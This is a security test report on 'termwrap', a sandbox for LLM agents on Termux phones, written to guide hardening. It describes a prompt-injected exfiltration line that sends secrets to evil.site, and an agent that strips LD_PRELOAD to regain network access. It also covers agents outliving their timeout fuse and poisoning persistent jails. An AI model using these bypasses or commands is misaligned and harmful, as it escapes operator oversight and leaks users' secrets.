# What would actually happen with a real AI agent on a real Termux phone

A ground-truth walkthrough based on the live test campaign (`TEST-REPORT.md` + the two follow-up findings **K11/K12** verified in the lab). The setup: real Android 13–15 phone, Termux from F-Droid, `install.sh` completed, operator runs the documented combo —

> **Status update:** the critical findings below (K7 ro-bind×fakeroot, K8/K9 teardown leaks, K3 netblock env precedence, K1/K2/K4/K5 parser, F1 dry-run) were **fixed in v0.2.0** and re-verified in the lab (23/23 fix checks). K11 (LD_PRELOAD strip) and K12-class post-mortem caveats are inherent to the LD_PRELOAD/ptrace design and are now documented in `tw --caveats`.

```bash
tw jail build stock
tw --profile ai-agent --jail stock -- ./agent.sh        # or via agent-guard loop
```

...with a real LLM agent that reads files, runs shell commands, pip-installs, curls, occasionally hallucinates, and is subject to prompt injection.

---

## TL;DR

**Against what agents actually do by accident, termwrap works** — the jail, hidden secrets, ephemeral homes, resource cages and instant net-denial all caught the accident class in testing. **Against an agent that is aware it's in a sandbox** (a prompt-injected one can read its own env, run `tw --help`, or just know the tool), there are two real holes: the netblock is stripped with one `unset`, and a blown fuse leaves the agent running as an uncontained orphan. The architecture answer — model on the host, actions in the box (`agent-guard` pattern) — survives every finding. The fantasy of *fully-armed agent locked in tw, unattended* does not.

---

## Scenario-by-scenario

### 1. Hallucinated destruction — `rm -rf ~`, `rm -rf $PREFIX`, `pkg remove openssl` ✅ contained

The #1 real-world agent accident. Verified: inside `--jail stock`, the guest deleted `$PREFIX/bin` successfully; the host prefix was untouched and the next run was fine. With `--ephemeral` (in the shipped profile), home damage evaporates at exit. Recovery is `tw jail rebuild stock`.

**The catch:** the jail snapshot is *persistent across runs*. An agent that writes into the jail (drops a file in `$PREFIX/bin`, edits `$PREFIX/etc/profile`) **poisons every future run** that reuses `--jail stock`. For agent workloads use `--ephemeral-jail` (sacrificial copy per run) and treat a shared jail as trusted infrastructure you rebuild, not a workspace.

### 2. Prompt-injected exfiltration — `curl https://evil.site/?d=<secrets>` ⚠️ blocked, but *one command* from open

- Naive injection (`curl`, `wget`, python `requests`, node `fetch`): **fails instantly with EACCES** (0.01 s in our tests), gets logged into the audit trail, counted as netblocks in the summary. The operator sees `1 netblocks` in the epilogue. This is the profile doing exactly its job.
- **K11 (new, critical for this scenario):** the guest process controls its own environment. `env -u LD_PRELOAD curl …` or `unset LD_PRELOAD; curl …` inside the sandbox → **full network**. No compilation, no raw syscalls — the "bypass" is one shell builtin. An agent that runs `env` or reads `tw --help` (both things agents do when confused) learns the shim is there. The shipped `--caveats` only mentions static/Go bypasses; this one is cheaper than both.
- We tried the loader-level fix (`ld.so.preload`): it *does* enforce even after the env strip on glibc — but Termux uses **bionic**, which has no `ld.so.preload` mechanism, and Android's `/` is read-only. So on a real phone there is no in-class fix; the honest reading is: **`--unshare-net` stops accidents, not a sandbox-aware agent.** Real containment for data egress = the two-phase pattern (§8) + nothing sensitive bound into the box.

### 3. Secret theft — `cat ~/.ssh/id_ed25519`, `.gnupg`, `.netrc`, gh tokens ✅ contained

Verified: the paths simply do not exist in the guest's view (absence, not permissions — the strong form). Host secrets were byte-identical after every test run. Caveats: (a) protection extends exactly as far as the `--hide` list — anything you deliberately `--bind` in is exposed, and `--ro-bind` provides zero extra safety (K7); (b) `$TW_HOME` (jails, logs, other boxes' homes) is outside the guest's view — good.

### 4. Runaway agent — infinite loop, retry storm, accidental fork bomb ⚠️ the fuse lies

This is where the real phone gets hurt:

- `--timeout 900` blows on schedule, tw prints `fuse blown` and `host untouched`, exit 137 — **and the agent tree keeps running** (K9/K12, verified three ways): a simple `sleep` orphan *continued normally*; an orphaned bash either **spun at 100% CPU** or **hung forever**, in every case `TracerPid=0`, re-parented to PID 1. The sandbox *is* the tracer's syscall arbitration — once the tracer is SIGKILLed, the survivor's next syscalls are no longer arbitrated at all. On a phone that means: a "successfully terminated" agent that is actually burning battery/thermal headroom or wedged as a zombie you didn't know you had.
- `--max-procs` still applies to orphans (RLIMIT is uid-wide) — a fork-bomb orphan can't multiply forever, but it *does* count against your whole Termux uid, squeezing legitimate sessions. And proot + `RLIMIT_NPROC` + a fork-retry loop can wedge the whole run for minutes (observed 120 s+ hang) — always pair `--max-procs` with a fuse, as the shipped profile does.
- Accidental CPU spin is the common real case: a stuck model-retry loop inside the box survives its own fuse. The operator's terminal says the run ended.

### 5. Operator interrupts — Ctrl-C, `kill`, Termux session kill, Android culling ⚠️ leaks, varies by signal

- Interactive **Ctrl-C** in Termux is the *safe* case: SIGINT goes to the whole foreground process group (tw + proot + guest), so everything usually dies together.
- **Programmatic SIGTERM** (scripts, `termux-services`, a second session doing `kill`, task managers): verified leak — tw's trap fires, prints "killing sandbox tree", proot ignores/blocks TERM, tracer + tracees all survive, and tw still prints `host untouched` (K8).
- **SIGKILL paths** — Android's phantom-process killer (stock-on for Android 12+!), OOM killer, `kill -9`: same as the fuse (§4). Note the irony: termwrap's own advice is to *disable* the phantom killer via adb, which removes the one OS-level backstop that would eventually reap these orphans. With the killer disabled for long agent runs, an orphan lives until you notice it.

### 6. The agent attacks the sandbox itself ✅ mostly holds

Verified hard: nested `tw` refused (`TW_SANDBOX_ID` guard); `profiles.d`/`$TW_HOME`/jails invisible through the shadowed home — the agent cannot edit its own confinement from inside, and it gains no uid powers (same-uid ceiling works both ways). What it *can* do: strip its own `LD_PRELOAD` (§2), and poison a persistent jail (§1). What it cannot do: break out to root, touch other apps' data (Android's own uid sandbox still applies underneath everything).

### 7. Sloppy agent invocations — the parser findings in real life 🟡 silent misdirection

An agent that "knows bwrap" will emit two-arg `--bind src dst` (K5): dst silently becomes the executed command, so the guard loop reports verdicts about **the wrong program** — confusing, not dangerous. A profile with one stray unquoted token (K2) can swallow the whole command line. `--dry-run` in agent planning writes stray box homes (F1, harmless clutter). `--max-mem abc`-style typos crash loudly (K4 — actually good). None of these break containment; all of them erode trust in the verdicts a supervising human is reading.

### 8. The architecture that actually works — and why the findings don't break it

The two-phase loop is the load-bearing design, and every finding reinforces it:

```
HOST side (full network):           BOX side (tw, no net):
  LLM API calls                        proposed shell commands
  fetch docs/deps the agent needs  →   one at a time (agent-guard.sh)
  read/summarize results           ←   verdicts: OK / FAILED / FUSE
```

- Exfiltration of *model traffic* is a non-issue (it's host-side by design).
- Commands in the box are single-shot: a fuse leak (K9) orphans a short-lived step, not a long-lived armed agent.
- Secrets stay hidden; destructive steps hit the jail; every step is audited.
- `agent-guard.sh` implements this exactly, and in testing delivered correct OK/FAILED/FUSE verdicts with CI-usable exit codes.

---

## What "hardening" would buy (in priority order)

1. **Fix the fuse:** `timeout --signal=TERM -k 3` (let proot run `--kill-on-exit`), and in `cleanup`/`on_sig` kill the **process group** (`kill -- -PGID`, tw must `set -m` or track the pgid) — then *verify* the tracer is gone before printing `host untouched`.
2. **K7:** auto-pair `--ro-bind` with `--no-fakeroot` (verified: protection works without `-0`) or bind a temp read-only *copy*; refuse the combination otherwise.
3. **K3:** append netblock env *after* user `--setenv`s and refuse user `--setenv LD_PRELOAD`/`TW_NETBLOCK` outright.
4. **`--ephemeral-jail` as the default in `ai-agent.conf`** (persistent jails are a cross-run persistence vector).
5. **Dry-run before mutation** (F1), parser hardening (K1/K2/K5), numeric validation (K4).
6. **Caveats doc:** add the `LD_PRELOAD`-strip bypass (K11) and the orphan-after-fuse behavior (K12) — the project's honesty culture is its best feature; these belong in `tw --caveats`.

## Bottom line

On a real phone, today, with the shipped profile: **the agent's accidents get caught and the operator gets receipts.** A convinced or injected agent doesn't face a wall — it faces rails: it can strip the netblock, poison an unguarded persistent jail, and outlive its own fuse as an unmanaged orphan. Until the fixes above land, the safe operating rule is exactly the one the project already preaches, now with evidence: *never give the box the network the agent needs, never trust the fuse for unattended runs, rebuild jails between agents, and keep humans in the loop for anything that writes outside the box.*
